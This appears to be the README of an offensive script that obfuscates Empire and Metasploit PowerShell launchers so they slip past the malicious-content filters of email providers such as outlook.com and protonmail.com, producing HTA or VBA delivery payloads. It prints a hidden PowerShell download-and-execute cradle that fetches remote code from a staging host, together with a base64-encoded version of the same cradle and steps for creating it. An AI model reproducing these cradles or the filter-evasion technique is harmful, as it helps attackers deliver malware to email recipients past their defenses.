# Obfuscate Launcher

This script is designed to facilitate string obfuscation of payload launchers created by Empire and Metasploit.
It works by generating a random ascii pattern and inserting said pattern between each character of the original launcher.
This has been demonstrated to effectively bypass malicious content filtering on email providers including outlook.com, protonmail.com, and Lotus Notes.

The script also allows the user to specify a delivery mechanism (hta or vba) and will generate the necessary output to include in the final deliverable payload.

## Arguments

* -l, --launcher, file containing launcher one-liner
* -d, --delivery, delivery mechanism (hta, vba)

## Notes

The script expects PowerShell code to be in base64 encoded format that PowerShell can interpret (each byte converted individually).
The PowerShell payloads provided by Metasploit do not have the ability to encode the commands in this format at the time of writing.
Typically you will get output similat to the following (from exploit/multi/script/web_delivery):
<pre>powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('http://127.0.0.1:8080/6SVduO4');</pre>
The best way to deal with this is to take the Powershell code (everything after the "-c" in the previous example), save it to a file and run it through the ps_encode.py script by Carlos Perez: https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py

Then take the replace the "-c" in the original one-liner with a "-e" and follow it with the output of ps_encode.py to end up with something similar to:

<pre>powershell.exe -nop -w hidden -e JABGAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAEYALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABGAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAEYALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQALgAyADAAOgA5ADAAOQAwAC8ATwBkAEkAYQBkADYAWAB1AG8AJwApADsA</pre>

This one-liner can then be passed into obfuscate_launcher.py without any issues.
